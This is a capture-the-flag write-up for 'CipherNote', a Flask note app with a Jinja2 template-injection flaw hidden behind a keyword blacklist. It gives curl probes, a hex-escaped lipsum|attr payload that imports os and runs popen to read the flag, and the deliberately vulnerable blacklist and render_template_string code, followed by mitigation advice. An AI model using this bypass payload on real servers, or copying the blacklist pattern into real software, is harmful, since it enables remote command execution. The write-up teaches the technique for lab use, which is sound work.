# CipherNote — Writeup

**Category:** Web
**Flag:** `Pioneers25{t3mpl4t3_1nj3ct10n_b3y0nd_th3_f1lt3r}`

---

## Challenge Overview

CipherNote is a "secure" encrypted note-sharing platform built with Flask. Users can register, create notes, and preview them with a live rendering engine. The preview feature passes user input through `render_template_string()` — a classic Server-Side Template Injection (SSTI) sink — but a WAF blacklist sits in front of it.

> *"Your secrets, secured forever."*
>
> CipherNote is our new **zero-knowledge encrypted note platform**. We've implemented state-of-the-art WAF protection to ensure no one can abuse our template rendering engine. Our security team has blocklisted every dangerous keyword they could think of.
>
> Can you prove them wrong?

---

## Deployment

### Docker (Recommended)

```bash
docker-compose up --build -d
```

The challenge will be available at `http://localhost:5000`.

### Local Development

```bash
pip install -r requirements.txt
python app.py
```

---

## Reconnaissance & Blackbox Testing

### 1. Exploring the Application

After registering and logging in, the **Create Note** page reveals a **"Preview"** button. Clicking it sends the note content to `/preview` via AJAX and renders the result server-side.

### 2. Testing for Template Injection

Let's test if the application processes template expressions:

```bash
# Test basic math expression
curl -X POST http://localhost:5000/preview \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "content={{7*7}}"
```

**Response:**
```
⚠ Dangerous content detected. Your input contains blocked keywords.
```

This confirms two things:
- There's a template rendering engine (likely Jinja2 based on Flask)
- There's a WAF filtering dangerous input

### 3. Enumerating the Blacklist

Through trial and error, we discover that these patterns and keywords are blocked:

```bash
# Test various common SSTI patterns
curl -X POST http://localhost:5000/preview \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "content={{7*7}}"           # Blocked: {{ }}
  -d "content={{config}}"        # Blocked: config
  -d "content={{''.__class__}}"  # Blocked: __
```

Testing systematically reveals the blocklist:
```
{{  }}  __  config  class  import  os  popen  eval  exec  subprocess
flag  self  request  application  init  globals  getattr  builtins
mro  base  subclasses  open  read  system
```

The WAF performs a case-insensitive substring match against all of these.

### 4. Finding WAF Bypass Techniques

**Discovery 1: Alternative Jinja2 Syntax**

Jinja2 supports multiple delimiter types. Let's test `{% %}` block tags:

```bash
curl -X POST http://localhost:5000/preview \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "content={%print(7*7)%}"
```

**Response:**
```
49
```

✅ Success! The `{% %}` syntax works and bypasses the `{{` `}}` filters.

**Discovery 2: Hex Encoding in Strings**

Since `__` is blocked, let's try hex-encoding within string literals:

```bash
curl -X POST http://localhost:5000/preview \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "content={%print(lipsum|attr('\x5f\x5fclass\x5f\x5f'))%}"
```

This works! The WAF only checks the raw input string, not the decoded values.

**Discovery 3: Using `lipsum` Built-in**

The `lipsum` object is a Jinja2 built-in that has access to `__globals__`:

```bash
curl -X POST http://localhost:5000/preview \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "content={%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f'))%}"
```

This shows us the global namespace is accessible.

### 5. Crafting the Final Payload

By chaining hex-encoded attribute access through the `|attr()` filter, we can:
1. Access `lipsum.__globals__`
2. Get `__builtins__`
3. Call `__import__('os')`
4. Execute `popen('type \\fla*.txt')` (Windows wildcard to avoid "flag")
5. Read the output

The final working payload:
```jinja2
{%print(
  lipsum
  |attr('\x5f\x5fgl\x6f\x62al\x73\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp\x6frt\x5f\x5f')('\x6f\x73')
  |attr('p\x6fpen')('type \\fla*.txt')
  |attr('re\x61d')()
)%}
```

---

## Exploitation

### Execution

Paste the payload into the note content field, click **Preview**, and the flag appears in the preview panel:

```
Pioneers25{t3mpl4t3_1nj3ct10n_b3y0nd_th3_f1lt3r}
```

**Hex encoding breakdown used in payload:**

| Blocked Keyword | Hex-Encoded Version |
|---|---|
| `__` | `\x5f\x5f` |
| `globals` | `gl\x6f\x62al\x73` |
| `builtins` | `\x62uiltins` |
| `import` | `imp\x6frt` |
| `os` | `\x6f\x73` |
| `popen` | `p\x6fpen` |
| `read` | `re\x61d` |
| `flag` | `fla*.txt` (glob) |

---

## Automated Solver

```bash
python solver.py http://TARGET:5000
```

The solver script automatically registers, logs in, sends the SSTI bypass, and extracts the flag.

---

## Understanding the Source Code Vulnerabilities

Now that we've successfully exploited the application, let's examine the source code to understand the underlying flaw.

### The Vulnerable Code

#### WAF Implementation (`app.py`)

```python
BLACKLIST = [
    "{{", "}}", "__",
    "config", "class", "import", "os", "popen", "eval", "exec",
    "subprocess", "flag", "self", "request", "application", "init",
    "globals", "getattr", "builtins", "mro", "base", "subclasses",
    "open", "read", "system"
]

def is_safe(content):
    content_lower = content.lower()
    for keyword in BLACKLIST:
        if keyword.lower() in content_lower:
            return False
    return True
```

**Why this is flawed:**
- Only checks the **raw string** input, not the interpreted result
- Doesn't account for hex escape sequences like `\x5f` that get decoded by Python's string parser
- Case-insensitive check, but hex escapes bypass this entirely

#### The SSTI Sink

```python
@app.route('/preview', methods=['POST'])
@login_required
def preview():
    content = request.form.get('content', '')

    if not is_safe(content):
        return "⚠ Dangerous content detected. Your input contains blocked keywords."

    try:
        # Direct template rendering without sandboxing
        rendered = render_template_string(content)
        return rendered
    except Exception as e:
        return "Error rendering template"
```

**Critical issues:**
1. `render_template_string()` is called on user input with **full Jinja2 capabilities**
2. No sandboxing or restricted execution environment
3. WAF check happens on the raw string, not the processed template
4. The `|attr()` filter allows dynamic attribute access with any string, including those containing escape sequences

### Attack Chain Breakdown

```python
lipsum                                          # Built-in Jinja2 object
|attr('\x5f\x5fglobals\x5f\x5f')               # Access __globals__ (hex-encoded)
|attr('\x5f\x5fgetitem\x5f\x5f')('__builtins__')  # Get __builtins__ dict
|attr('\x5f\x5fgetitem\x5f\x5f')('__import__')    # Get __import__ function
('\x6f\x73')                                    # Import 'os' module (hex-encoded)
|attr('p\x6fpen')('type \\fla*.txt')           # Call os.popen() (hex-encoded)
|attr('re\x61d')()                              # Read command output (hex-encoded)
```

**Why it works:**
- The string `'\x5f\x5fglobals\x5f\x5f'` passes the WAF check (no literal `__`)
- When Jinja2 processes `|attr('\x5f\x5fglobals\x5f\x5f')`, Python decodes the hex escapes to `__globals__`
- This gives us access to the entire Python runtime environment

---

## Key Takeaways

- **Blacklist-based WAF** is fundamentally flawed — there are always bypass vectors
- **String filtering on raw input** doesn't account for encoding/escaping at interpretation time
- Jinja2's `{%` tags are an alternative to `{{` for code execution
- The `|attr()` filter allows attribute access using arbitrary strings, which can contain hex escapes
- **Proper SSTI mitigation requires:**
  - Sandboxing the template engine (e.g., Jinja2's `SandboxedEnvironment`)
  - Never calling `render_template_string()` on untrusted input
  - Using a whitelist-based approach if templating is necessary
  - Input validation at the semantic level, not just string matching
